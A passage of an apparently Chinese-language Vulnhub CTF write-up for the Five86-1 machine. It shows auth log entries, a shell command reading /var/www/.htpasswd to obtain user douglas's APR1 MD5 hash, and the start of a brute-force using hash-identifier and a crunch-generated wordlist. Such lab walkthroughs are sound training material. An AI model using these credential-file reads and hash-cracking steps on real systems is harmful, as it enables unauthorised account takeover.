+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Oct &lt;span class="m"&gt;11&lt;/span&gt; 2:59:20 five86-1 guest@10.10.10.1: &lt;span class="o"&gt;[&lt;/span&gt;DEFAULT&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="nv"&gt;ERROR&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; Login failure &lt;span class="k"&gt;for&lt;/span&gt; guest using authtype local: Password incorrect
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Oct &lt;span class="m"&gt;11&lt;/span&gt; 3:00:40 five86-1 guest@10.10.10.10: &lt;span class="o"&gt;[&lt;/span&gt;DEFAULT&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="nv"&gt;ERROR&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; Login failure &lt;span class="k"&gt;for&lt;/span&gt; guest using authtype local: Password incorrect
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Oct &lt;span class="m"&gt;11&lt;/span&gt; 3:01:33 five86-1 guest@10.10.10.10: &lt;span class="o"&gt;[&lt;/span&gt;DEFAULT&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="nv"&gt;ERROR&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; Login failure &lt;span class="k"&gt;for&lt;/span&gt; guest using authtype local: Password incorrect
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Oct &lt;span class="m"&gt;11&lt;/span&gt; 3:01:45 five86-1 guest@10.10.10.10: &lt;span class="o"&gt;[&lt;/span&gt;DEFAULT&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="nv"&gt;ERROR&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; Login failure &lt;span class="k"&gt;for&lt;/span&gt; guest using authtype local: Password incorrect
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Oct &lt;span class="m"&gt;11&lt;/span&gt; 3:02:36 five86-1 guest@10.10.10.10: &lt;span class="o"&gt;[&lt;/span&gt;DEFAULT&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="nv"&gt;ERROR&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; Login failure &lt;span class="k"&gt;for&lt;/span&gt; guest using authtype local: Password incorrect
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Oct &lt;span class="m"&gt;11&lt;/span&gt; 3:02:52 five86-1 guest@10.10.10.10: &lt;span class="o"&gt;[&lt;/span&gt;DEFAULT&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="nv"&gt;ERROR&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; Login failure &lt;span class="k"&gt;for&lt;/span&gt; guest using authtype local: Password incorrect
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Oct &lt;span class="m"&gt;11&lt;/span&gt; 3:03:57 five86-1 guest@10.10.10.10: &lt;span class="o"&gt;[&lt;/span&gt;DEFAULT&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="nv"&gt;ERROR&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; Login failure &lt;span class="k"&gt;for&lt;/span&gt; guest using authtype local: Password incorrect
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Oct &lt;span class="m"&gt;11&lt;/span&gt; 3:04:42 five86-1 guest@10.10.10.10: &lt;span class="o"&gt;[&lt;/span&gt;DEFAULT&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="nv"&gt;ERROR&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; Login failure &lt;span class="k"&gt;for&lt;/span&gt; guest using authtype local: Password incorrect
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Oct &lt;span class="m"&gt;11&lt;/span&gt; 3:04:46 five86-1 guest@10.10.10.10: &lt;span class="o"&gt;[&lt;/span&gt;DEFAULT&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="nv"&gt;ERROR&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; Login failure &lt;span class="k"&gt;for&lt;/span&gt; guest using authtype local: Password incorrect
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Oct &lt;span class="m"&gt;11&lt;/span&gt; 3:05:21 five86-1 guest@10.10.10.10: &lt;span class="o"&gt;[&lt;/span&gt;DEFAULT&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="nv"&gt;ERROR&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; Login failure &lt;span class="k"&gt;for&lt;/span&gt; guest using authtype local: Password incorrect
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Oct &lt;span class="m"&gt;11&lt;/span&gt; 3:05:45 five86-1 guest@10.10.10.10: &lt;span class="o"&gt;[&lt;/span&gt;DEFAULT&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="nv"&gt;ERROR&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; Login failure &lt;span class="k"&gt;for&lt;/span&gt; guest using authtype local: Password incorrect
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Oct &lt;span class="m"&gt;11&lt;/span&gt; 3:05:49 five86-1 guest@10.10.10.10: &lt;span class="o"&gt;[&lt;/span&gt;DEFAULT&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="nv"&gt;ERROR&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; Login failure &lt;span class="k"&gt;for&lt;/span&gt; guest using authtype local: Password incorrect
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Oct &lt;span class="m"&gt;11&lt;/span&gt; 3:06:17 five86-1 guest@10.10.10.10: &lt;span class="o"&gt;[&lt;/span&gt;DEFAULT&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="nv"&gt;ERROR&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; Login failure &lt;span class="k"&gt;for&lt;/span&gt; guest using authtype local: Password incorrect
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Oct &lt;span class="m"&gt;11&lt;/span&gt; 3:06:34 five86-1 guest@10.10.10.10: &lt;span class="o"&gt;[&lt;/span&gt;DEFAULT&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="nv"&gt;ERROR&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; Login failure &lt;span class="k"&gt;for&lt;/span&gt; guest using authtype local: Password incorrect
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Oct &lt;span class="m"&gt;11&lt;/span&gt; 3:06:43 five86-1 guest@10.10.10.10: &lt;span class="o"&gt;[&lt;/span&gt;DEFAULT&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="nv"&gt;ERROR&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; Login failure &lt;span class="k"&gt;for&lt;/span&gt; guest using authtype local: Password incorrect
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Oct &lt;span class="m"&gt;11&lt;/span&gt; 3:06:46 five86-1 guest@10.10.10.10: &lt;span class="o"&gt;[&lt;/span&gt;DEFAULT&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="nv"&gt;ERROR&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; Login failure &lt;span class="k"&gt;for&lt;/span&gt; guest using authtype local: Password incorrect
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Oct &lt;span class="m"&gt;11&lt;/span&gt; 3:06:58 five86-1 guest@10.10.10.10: &lt;span class="o"&gt;[&lt;/span&gt;DEFAULT&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="nv"&gt;ERROR&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; Login failure &lt;span class="k"&gt;for&lt;/span&gt; guest using authtype local: Password incorrect
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Oct &lt;span class="m"&gt;11&lt;/span&gt; 3:07:26 five86-1 guest@10.10.10.10: &lt;span class="o"&gt;[&lt;/span&gt;DEFAULT&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="nv"&gt;ERROR&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; Login failure &lt;span class="k"&gt;for&lt;/span&gt; guest using authtype local: Password incorrect
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Oct &lt;span class="m"&gt;11&lt;/span&gt; 3:08:07 five86-1 guest@10.10.10.10: &lt;span class="o"&gt;[&lt;/span&gt;DEFAULT&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="nv"&gt;ERROR&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; Login failure &lt;span class="k"&gt;for&lt;/span&gt; guest using authtype local: Password incorrect
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Oct &lt;span class="m"&gt;11&lt;/span&gt; 3:08:39 five86-1 guest@10.10.10.10: &lt;span class="o"&gt;[&lt;/span&gt;DEFAULT&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="nv"&gt;ERROR&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; Login failure &lt;span class="k"&gt;for&lt;/span&gt; guest using authtype local: Password incorrect
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Oct &lt;span class="m"&gt;11&lt;/span&gt; 3:08:43 five86-1 guest@10.10.10.10: &lt;span class="o"&gt;[&lt;/span&gt;DEFAULT&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="nv"&gt;ERROR&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; Login failure &lt;span class="k"&gt;for&lt;/span&gt; guest using authtype local: Password incorrect
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Oct &lt;span class="m"&gt;11&lt;/span&gt; 3:08:51 five86-1 guest@10.10.10.10: &lt;span class="o"&gt;[&lt;/span&gt;DEFAULT&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="nv"&gt;ERROR&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; Login failure &lt;span class="k"&gt;for&lt;/span&gt; guest using authtype local: Password incorrect
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Oct &lt;span class="m"&gt;11&lt;/span&gt; 3:08:55 five86-1 guest@10.10.10.10: &lt;span class="o"&gt;[&lt;/span&gt;DEFAULT&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="nv"&gt;ERROR&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; Login failure &lt;span class="k"&gt;for&lt;/span&gt; guest using authtype local: Password incorrect
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Oct &lt;span class="m"&gt;11&lt;/span&gt; 3:09:45 five86-1 guest@10.10.10.10: &lt;span class="o"&gt;[&lt;/span&gt;DEFAULT&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="nv"&gt;ERROR&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; Login failure &lt;span class="k"&gt;for&lt;/span&gt; guest using authtype local: Password incorrect
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Oct &lt;span class="m"&gt;11&lt;/span&gt; 3:09:59 five86-1 guest@10.10.10.10: &lt;span class="o"&gt;[&lt;/span&gt;DEFAULT&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="nv"&gt;ERROR&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; Login failure &lt;span class="k"&gt;for&lt;/span&gt; guest using authtype local: Password incorrect
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Oct &lt;span class="m"&gt;11&lt;/span&gt; 3:10:12 five86-1 guest@10.10.10.10: &lt;span class="o"&gt;[&lt;/span&gt;DEFAULT&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="nv"&gt;ERROR&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; Login failure &lt;span class="k"&gt;for&lt;/span&gt; guest using authtype local: Password incorrect
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Oct &lt;span class="m"&gt;11&lt;/span&gt; 3:12:39 five86-1 guest@10.10.10.10: &lt;span class="o"&gt;[&lt;/span&gt;DEFAULT&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="nv"&gt;ERROR&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; Login failure &lt;span class="k"&gt;for&lt;/span&gt; guest using authtype local: Password incorrect
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Oct &lt;span class="m"&gt;11&lt;/span&gt; 3:13:55 five86-1 guest@10.10.10.10: &lt;span class="o"&gt;[&lt;/span&gt;DEFAULT&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="nv"&gt;ERROR&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; Login failure &lt;span class="k"&gt;for&lt;/span&gt; guest using authtype local: Password incorrect
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Oct &lt;span class="m"&gt;11&lt;/span&gt; 3:14:24 five86-1 guest@10.10.10.10: &lt;span class="o"&gt;[&lt;/span&gt;DEFAULT&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="nv"&gt;ERROR&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; Login failure &lt;span class="k"&gt;for&lt;/span&gt; guest using authtype local: Password incorrect
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Oct &lt;span class="m"&gt;11&lt;/span&gt; 3:14:24 five86-1 guest@10.10.10.10: &lt;span class="o"&gt;[&lt;/span&gt;DEFAULT&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="nv"&gt;ERROR&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; Login failure &lt;span class="k"&gt;for&lt;/span&gt; guest using authtype local: Password incorrect
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Oct &lt;span class="m"&gt;11&lt;/span&gt; 3:14:51 five86-1 guest@10.10.10.10: &lt;span class="o"&gt;[&lt;/span&gt;DEFAULT&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="nv"&gt;ERROR&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; Login failure &lt;span class="k"&gt;for&lt;/span&gt; guest using authtype local: Password incorrect
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;/var/www/.htpasswd 读取这个文件看看&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;span class="lnt"&gt;2
+&lt;/span&gt;&lt;span class="lnt"&gt;3
+&lt;/span&gt;&lt;span class="lnt"&gt;4
+&lt;/span&gt;&lt;span class="lnt"&gt;5
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-shell" data-lang="shell"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;sh$ cat /var/www/.htpasswd
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;douglas:&lt;span class="nv"&gt;$apr1$9&lt;/span&gt;fgG/hiM&lt;span class="nv"&gt;$BtsL9qpNHUlylaLxk81qY1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# To make things slightly less painful (a standard dictionary will likely fail),&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# use the following character set for this 10 character password: aefhrt &lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;里面是用户 douglas 的 Apache MD5 哈希，并且文件注释直接给出了密码长度和字符集提示&lt;/p&gt;
+&lt;p&gt;这里也提醒我忘记看有哪个用户了&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;span class="lnt"&gt;2
+&lt;/span&gt;&lt;span class="lnt"&gt;3
+&lt;/span&gt;&lt;span class="lnt"&gt;4
+&lt;/span&gt;&lt;span class="lnt"&gt;5
+&lt;/span&gt;&lt;span class="lnt"&gt;6
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-shell" data-lang="shell"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;sh$ ls /home/
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;douglas
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;jen
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;moss
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;richmond
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;roy
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;密码长度：10 位&lt;/p&gt;
+&lt;p&gt;可用字符集：aefhrt&lt;/p&gt;
+&lt;p&gt;在一个新终端进行如下操作&lt;/p&gt;
+&lt;h2 id="爆破用户-douglas-的密码"&gt;爆破用户 douglas 的密码
+&lt;/h2&gt;&lt;p&gt;先识别hash类型，确定为md5&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
+&lt;/span&gt;&lt;span class="lnt"&gt; 2
+&lt;/span&gt;&lt;span class="lnt"&gt; 3
+&lt;/span&gt;&lt;span class="lnt"&gt; 4
+&lt;/span&gt;&lt;span class="lnt"&gt; 5
+&lt;/span&gt;&lt;span class="lnt"&gt; 6
+&lt;/span&gt;&lt;span class="lnt"&gt; 7
+&lt;/span&gt;&lt;span class="lnt"&gt; 8
+&lt;/span&gt;&lt;span class="lnt"&gt; 9
+&lt;/span&gt;&lt;span class="lnt"&gt;10
+&lt;/span&gt;&lt;span class="lnt"&gt;11
+&lt;/span&gt;&lt;span class="lnt"&gt;12
+&lt;/span&gt;&lt;span class="lnt"&gt;13
+&lt;/span&gt;&lt;span class="lnt"&gt;14
+&lt;/span&gt;&lt;span class="lnt"&gt;15
+&lt;/span&gt;&lt;span class="lnt"&gt;16
+&lt;/span&gt;&lt;span class="lnt"&gt;17
+&lt;/span&gt;&lt;span class="lnt"&gt;18
+&lt;/span&gt;&lt;span class="lnt"&gt;19
+&lt;/span&gt;&lt;span class="lnt"&gt;20
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-shell" data-lang="shell"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;┌──&lt;span class="o"&gt;(&lt;/span&gt;kali㉿kali&lt;span class="o"&gt;)&lt;/span&gt;-&lt;span class="o"&gt;[&lt;/span&gt;~/Labs/Vulnhub/Five86-1&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;└─$ hash-identifier 
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="c1"&gt;#########################################################################&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="c1"&gt;# __ __ __ ______ _____ #&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="c1"&gt;# /\ \/\ \ /\ \ /\__ _\ /\ _ `\ #&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="c1"&gt;# \ \ \_\ \ __ ____ \ \ \___ \/_/\ \/ \ \ \/\ \ #&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="c1"&gt;# \ \ _ \ /&amp;#39;__`\ / ,__\ \ \ _ `\ \ \ \ \ \ \ \ \ #&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="c1"&gt;# \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \ \_\ \__ \ \ \_\ \ #&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="c1"&gt;# \ \_\ \_\ \___ \_\/\____/ \ \_\ \_\ /\_____\ \ \____/ #&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="c1"&gt;# \/_/\/_/\/__/\/_/\/___/ \/_/\/_/ \/_____/ \/___/ v1.2 #&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="c1"&gt;# By Zion3R #&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="c1"&gt;# www.Blackploit.com #&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="c1"&gt;# Root@Blackploit.com #&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="c1"&gt;#########################################################################&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;--------------------------------------------------
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; HASH: &lt;span class="nv"&gt;$apr1$9&lt;/span&gt;fgG/hiM&lt;span class="nv"&gt;$BtsL9qpNHUlylaLxk81qY1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Possible Hashs:
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;+&lt;span class="o"&gt;]&lt;/span&gt; MD5&lt;span class="o"&gt;(&lt;/span&gt;APR&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;--------------------------------------------------
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h3 id="生成密码字典然后爆破"&gt;生成密码字典，然后爆破
+&lt;/h3&gt;&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
+&lt;/span&gt;&lt;span class="lnt"&gt; 2
+&lt;/span&gt;&lt;span class="lnt"&gt; 3
+&lt;/span&gt;&lt;span class="lnt"&gt; 4
+&lt;/span&gt;&lt;span class="lnt"&gt; 5
+&lt;/span&gt;&lt;span class="lnt"&gt; 6
+&lt;/span&gt;&lt;span class="lnt"&gt; 7
+&lt;/span&gt;&lt;span class="lnt"&gt; 8
+&lt;/span&gt;&lt;span class="lnt"&gt; 9
+&lt;/span&gt;&lt;span class="lnt"&gt;10
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-shell" data-lang="shell"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;┌──&lt;span class="o"&gt;(&lt;/span&gt;kali㉿kali&lt;span class="o"&gt;)&lt;/span&gt;-&lt;span class="o"&gt;[&lt;/span&gt;~/Labs/Vulnhub/Five86-1&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;└─$ crunch &lt;span class="m"&gt;10&lt;/span&gt; &lt;span class="m"&gt;10&lt;/span&gt; aefhrt -o password.txt 
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Crunch will now generate the following amount of data: &lt;span class="m"&gt;665127936&lt;/span&gt; bytes
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="m"&gt;634&lt;/span&gt; MB
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="m"&gt;0&lt;/span&gt; GB
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="m"&gt;0&lt;/span&gt; TB
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="m"&gt;0&lt;/span&gt; PB
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Crunch will now generate the following number of lines: &lt;span class="m"&gt;60466176&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;crunch: 100% completed generating output
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&amp;rsquo;echo &amp;lsquo;$apr1$9fgG/hiM$BtsL9qpNHUlylaLxk81qY1&amp;rsquo; &amp;gt; douglas.hash&amp;rsquo;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
+&lt;/span&gt;&lt;span class="lnt"&gt; 2
+&lt;/span&gt;&lt;span class="lnt"&gt; 3
+&lt;/span&gt;&lt;span class="lnt"&gt; 4
+&lt;/span&gt;&lt;span class="lnt"&gt; 5
+&lt;/span&gt;&lt;span class="lnt"&gt; 6
+&lt;/span&gt;&lt;span class="lnt"&gt; 7
+&lt;/span&gt;&lt;span class="lnt"&gt; 8
+&lt;/span&gt;&lt;span class="lnt"&gt; 9
+&lt;/span&gt;&lt;span class="lnt"&gt;10
+&lt;/span&gt;&lt;span class="lnt"&gt;11
+&lt;/span&gt;&lt;span class="lnt"&gt;12
+&lt;/span&gt;&lt;span class="lnt"&gt;13
+&lt;/span&gt;&lt;span class="lnt"&gt;14
+&lt;/span&gt;&lt;span class="lnt"&gt;15
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
